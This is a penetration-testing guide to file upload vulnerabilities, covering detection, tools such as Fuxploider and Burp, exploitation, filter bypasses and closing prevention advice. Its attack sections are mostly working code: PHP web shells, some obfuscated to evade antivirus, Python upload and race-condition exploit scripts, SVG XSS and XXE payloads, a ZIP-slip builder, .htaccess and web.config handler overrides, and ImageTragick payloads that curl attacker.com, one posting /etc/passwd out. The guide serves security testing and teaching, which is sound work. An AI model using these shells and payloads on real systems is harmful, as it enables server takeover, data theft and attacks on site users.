# File Upload Vulnerabilities - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Attack Mechanics](#attack-mechanics)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation Scenarios](#exploitation-scenarios)
6. [Bypass Techniques](#bypass-techniques)
7. [Advanced Exploitation](#advanced-exploitation)
8. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

File upload vulnerabilities occur when a web application doesn't properly validate files uploaded by users, allowing attackers to upload malicious files that can lead to remote code execution, stored XSS, or denial of service.

**Impact**:
- Remote Code Execution (RCE)
- Stored Cross-Site Scripting (XSS)
- Server-side request forgery (SSRF)
- Denial of Service (DoS)
- Information disclosure
- Defacement
- Complete server compromise

**Common Vulnerable Features**:
- Profile picture upload
- Document upload
- Avatar/image upload
- File sharing functionality
- Resume/CV upload
- Import features (CSV, XML, JSON)

---

## Attack Mechanics

### Basic Attack Flow

```
1. Identify file upload functionality
2. Analyze validation mechanisms
3. Craft malicious file
4. Bypass restrictions
5. Upload malicious file
6. Access uploaded file to execute payload
7. Gain shell access or execute malicious code
```

### Types of Validation

**Client-Side Validation**:
- JavaScript file type checking
- File extension validation in browser
- MIME type checking (easily bypassed)

**Server-Side Validation**:
- File extension blacklist/whitelist
- MIME type checking
- File content validation (magic bytes)
- File size restrictions
- Malware scanning
- Image reprocessing

---

## Detection Techniques

### Identifying Upload Functionality

**Common Endpoints**:
```
/upload
/upload.php
/upload.aspx
/api/upload
/profile/avatar
/documents/upload
/import
/media/upload
```

**Testing Steps**:

**Step 1: Baseline Test**
```bash
# Upload legitimate file
curl -F "file=@test.jpg" https://target.com/upload

# Note response and file location
```

**Step 2: Extension Analysis**
```bash
# Try different extensions
test.php
test.php5
test.phtml
test.asp
test.aspx
test.jsp
test.jspx
```

**Step 3: MIME Type Test**
```bash
# Upload with modified MIME type
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload
```

**Step 4: Content Analysis**
Upload file and check:
- Where is it stored?
- Is it accessible via web?
- Is it executed or downloaded?
- Is filename preserved or randomized?

---

## Scanning Tools

### 1. Upload Scanner (Burp Extension)

**Installation**:
```
Burp Suite → Extender → BApp Store → Upload Scanner
```

**Usage**:
1. Intercept upload request in Burp
2. Right-click → "Scan with Upload Scanner"
3. Analyzes various upload bypass techniques
4. Reports vulnerable configurations

### 2. Fuxploider

```bash
# Install
git clone https://github.com/almandin/fuxploider
cd fuxploider
pip3 install -r requirements.txt

# Basic scan
python3 fuxploider.py --url https://target.com/upload

# Specify allowed extensions (from observation)
python3 fuxploider.py --url https://target.com/upload --allowed-extensions jpg,png,gif

# Custom wordlist
python3 fuxploider.py --url https://target.com/upload --wordlist shells.txt

# Detect reflection (where files are stored)
python3 fuxploider.py --url https://target.com/upload --auto-detect

# Full scan with all options
python3 fuxploider.py --url https://target.com/upload \
  --allowed-extensions jpg,png \
  --proxy http://127.0.0.1:8080 \
  --wordlist shells.txt
```

### 3. Burp Intruder

**Manual Testing**:
```
1. Intercept upload request
2. Send to Intruder
3. Mark filename position
4. Payloads: shell.php, shell.php5, shell.phtml, etc.
5. Analyze responses for successful uploads
```

**Payload Positions**:
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="§shell.php§"
Content-Type: §image/jpeg§

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

### 4. Manual Testing

**Python Script**:
```python
import requests

url = "https://target.com/upload"
extensions = ['php', 'php5', 'phtml', 'pht', 'phps', 'php3', 'php4', 'php7']

for ext in extensions:
    filename = f"shell.{ext}"
    files = {
        'file': (filename, '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
    }

    r = requests.post(url, files=files)

    if 'success' in r.text.lower() or r.status_code == 200:
        print(f"[+] Potentially uploaded: {filename}")
        print(f"    Response: {r.text[:100]}")
```

---

## Exploitation Scenarios

### Scenario 1: Web Shell Upload (PHP)

**Attack**:
```php
<!-- Simple PHP shell -->
<?php system($_GET['cmd']); ?>

<!-- More features -->
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!-- One-liner -->
<?php @eval($_POST['cmd']); ?>

<!-- Web shell with file browser -->
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo '<form><input name="cmd"><input type="submit"></form>';
}
?>
```

**Upload**:
```bash
curl -F "file=@shell.php" https://target.com/upload
```

**Access**:
```bash
https://target.com/uploads/shell.php?cmd=whoami
https://target.com/uploads/shell.php?cmd=ls -la
https://target.com/uploads/shell.php?cmd=cat /etc/passwd
```

### Scenario 2: Stored XSS via SVG

**Malicious SVG**:
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

**Advanced SVG XSS**:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
```

**Upload and Access**:
```bash
# Upload
curl -F "avatar=@xss.svg" https://target.com/upload

# Victim accesses profile
https://target.com/profile/123
# SVG loads and XSS executes
```

### Scenario 3: XXE via SVG/XML Upload

**Malicious SVG with XXE**:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### Scenario 4: ZIP Slip Attack

**Malicious ZIP**:
```bash
# Create malicious archive
ln -s /etc/passwd passwd.txt
zip --symlinks evil.zip passwd.txt

# Or directory traversal in ZIP
# Contains file: ../../../../var/www/html/shell.php
```

**Python Script to Create ZIP**:
```python
import zipfile

# Create ZIP with path traversal
with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.writestr('../../../../var/www/html/shell.php',
                '<?php system($_GET["cmd"]); ?>')
```

### Scenario 5: SSRF via Image Processing

**ImageTragick (CVE-2016-3714)**:
```
# Create malicious image
push graphic-context
viewbox 0 0 640 480
fill 'url(http://attacker.com/x.jpg"|curl http://attacker.com/$(whoami)")'
pop graphic-context
```

### Scenario 6: Polyglot Files

**GIF + PHP Polyglot**:
```
GIF89a;<?php system($_GET['cmd']); ?>
```

**JPEG + PHP**:
```bash
# Add PHP code to JPEG comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg
```

---

## Bypass Techniques

### 1. Extension Bypasses

#### Double Extension
```
shell.php.jpg
shell.php.png
shell.php.gif
shell.jpg.php
```

#### Null Byte Injection (PHP < 5.3.4)
```
shell.php%00.jpg
shell.php\x00.jpg
```

#### Case Variation
```
shell.PHP
shell.PhP
shell.pHp
```

#### Alternative Extensions
```php
# PHP
.php, .php3, .php4, .php5, .php7, .pht, .phtml, .phps, .phar

# ASP
.asp, .aspx, .cer, .asa, .asax, .config

# JSP
.jsp, .jspx, .jsw, .jsv, .jspf

# Perl
.pl, .pm, .cgi

# Coldfusion
.cfm, .cfml, .cfc
```

#### Special Characters
```
shell.php%20
shell.php.
shell.php::$DATA (Windows)
shell.php:1.jpg (NTFS Alternate Data Stream)
shell.p.phphp
```

### 2. MIME Type Bypasses

**Intercept and Modify**:
```http
Content-Type: image/jpeg  <!-- Change from application/x-php -->
Content-Type: image/png
Content-Type: image/gif
```

**Magic Bytes Addition**:
```php
GIF89a<?php system($_GET['cmd']); ?>
```

```
GIF87a = 47 49 46 38 37 61
GIF89a = 47 49 46 38 39 61
PNG    = 89 50 4E 47 0D 0A 1A 0A
JPEG   = FF D8 FF E0
```

### 3. Content Filter Bypasses

#### Exif Data Injection
```bash
# Inject PHP in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg -o shell.php.jpg

# If application doesn't strip EXIF data
```

#### Polyglot Images
```bash
# Valid image + valid PHP
cat legit.jpg shell.php > polyglot.php
```

#### Image Resize Bypass
Some applications resize images, which can remove injected code. Bypasses:
- Use EXIF data (sometimes preserved)
- Use PNG tEXt chunks
- Use GIF comment fields

### 4. Path Traversal in Filename

```http
Content-Disposition: form-data; name="file"; filename="../../../shell.php"
Content-Disposition: form-data; name="file"; filename="..%2f..%2f..%2fshell.php"
Content-Disposition: form-data; name="file"; filename="shell.php\x00.jpg"
```

### 5. Race Condition

**Exploit**:
```python
import requests
import threading

url = "https://target.com/upload"
access_url = "https://target.com/uploads/shell.php"

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post(url, files=files)

def access():
    while True:
        r = requests.get(access_url + "?cmd=whoami")
        if "www-data" in r.text:
            print("[+] Shell accessed!")
            break

# Upload and immediately try to access before deletion
threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

### 6. Bypass Content Security Checks

#### Bypassing File Size Limits
```python
# If 1MB limit, upload 999KB file
# Pad with whitespace or comments
```

#### Bypassing Antivirus
```php
# Obfuscation
<?php $a='sys'.'tem'; $a($_GET['cmd']); ?>

# Base64 encoding
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

# String reversal
<?php $a=strrev("metsys"); $a($_GET['cmd']); ?>

# Function name from GET
<?php $_GET['a']($_GET['b']); ?>
# Access: shell.php?a=system&b=whoami
```

---

## Advanced Exploitation

### 1. .htaccess Upload

If you can upload `.htaccess`:

```apache
# Make .jpg files execute as PHP
AddType application/x-httpd-php .jpg

# Or
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**Attack Chain**:
1. Upload `.htaccess` with above content
2. Upload `shell.jpg` containing PHP code
3. Access `shell.jpg` - executes as PHP

### 2. Web.config Upload (IIS/.NET)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code here -->
```

### 3. ImageMagick Exploitation

**ImageTragick (CVE-2016-3714)**:

Create `exploit.mvg`:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl -d @/etc/passwd https://attacker.com")'
pop graphic-context
```

### 4. XXE in DOCX/XLSX

```bash
# Unzip DOCX
unzip document.docx -d docx_files

# Edit word/document.xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
...
<w:t>&xxe;</w:t>
...

# Rezip
cd docx_files
zip -r ../malicious.docx *
```

### 5. PDF Upload Attacks

**PDF with JavaScript**:
```pdf
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/OpenAction <<
/S /JavaScript
/JS (app.alert('XSS');)
>>
>>
endobj
```

---

## Prevention & Mitigation

### 1. File Extension Validation

```php
// Whitelist approach (RECOMMENDED)
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allowed)) {
    die("Invalid file type");
}
```

### 2. MIME Type Validation

```php
// Verify with finfo (magic bytes)
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['file']['tmp_name']);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($mime, $allowed_mimes)) {
    die("Invalid file type");
}
```

### 3. Rename Uploaded Files

```php
// Generate random filename
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
$upload_path = '/var/www/uploads/' . $new_name;
move_uploaded_file($_FILES['file']['tmp_name'], $upload_path);
```

### 4. Store Outside Web Root

```php
// Store outside public directory
$upload_dir = '/var/uploads/'; // Not /var/www/html/uploads/

// Serve via script with access control
// /download.php?id=123
```

### 5. File Content Validation

```php
// For images: reprocess with GD
$image = imagecreatefromjpeg($_FILES['file']['tmp_name']);
imagejpeg($image, '/var/www/uploads/' . $new_name, 90);
imagedestroy($image);

// This removes any injected PHP code
```

### 6. Set Proper Permissions

```bash
# Upload directory should not be executable
chmod 644 /var/www/uploads/*
chmod 755 /var/www/uploads

# Ensure web server can't execute files in upload dir
# Apache .htaccess:
<FilesMatch ".*">
  Options -ExecCGI
  SetHandler default-handler
  RemoveHandler .php .phtml .php3 .php4 .php5
  php_flag engine off
</FilesMatch>
```

### 7. Content Security Policy

```php
// Serve uploads with restrictive headers
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename=\"$filename\"");
header("X-Content-Type-Options: nosniff");
```

### 8. Antivirus Scanning

```php
// ClamAV integration
exec("clamscan " . escapeshellarg($tmp_file), $output, $return);

if ($return !== 0) {
    die("Malware detected");
}
```

### 9. File Size Limits

```php
// php.ini
upload_max_filesize = 2M
post_max_size = 2M

// Application level
if ($_FILES['file']['size'] > 2097152) { // 2MB
    die("File too large");
}
```

### 10. Disable Dangerous PHP Functions

```ini
; php.ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

### Security Checklist

- [ ] Whitelist allowed file extensions
- [ ] Validate MIME type using magic bytes (finfo)
- [ ] Rename uploaded files (random names)
- [ ] Store files outside web root
- [ ] Reprocess images to remove malicious code
- [ ] Set non-executable permissions on upload directory
- [ ] Limit file sizes
- [ ] Scan for malware
- [ ] Serve files with restrictive headers
- [ ] Never trust client-side validation
- [ ] Log all upload attempts
- [ ] Implement rate limiting
- [ ] Regular security audits

---

## Testing Checklist

- [ ] Identify upload functionality
- [ ] Test with legitimate file
- [ ] Note upload location and access URL
- [ ] Test file extension bypasses
- [ ] Test MIME type bypasses
- [ ] Test magic bytes manipulation
- [ ] Test double extensions
- [ ] Test null byte injection
- [ ] Test path traversal in filename
- [ ] Test .htaccess/.config upload
- [ ] Test polyglot files
- [ ] Test SVG XSS
- [ ] Test XXE in XML/SVG/DOCX
- [ ] Test ImageTragick
- [ ] Test ZIP slip
- [ ] Test race conditions
- [ ] Document all findings

---

**Additional Resources**:
- OWASP File Upload Cheat Sheet
- HackTricks - File Upload
- PayloadsAllTheThings - Upload Insecure Files
- PortSwigger File Upload Vulnerabilities
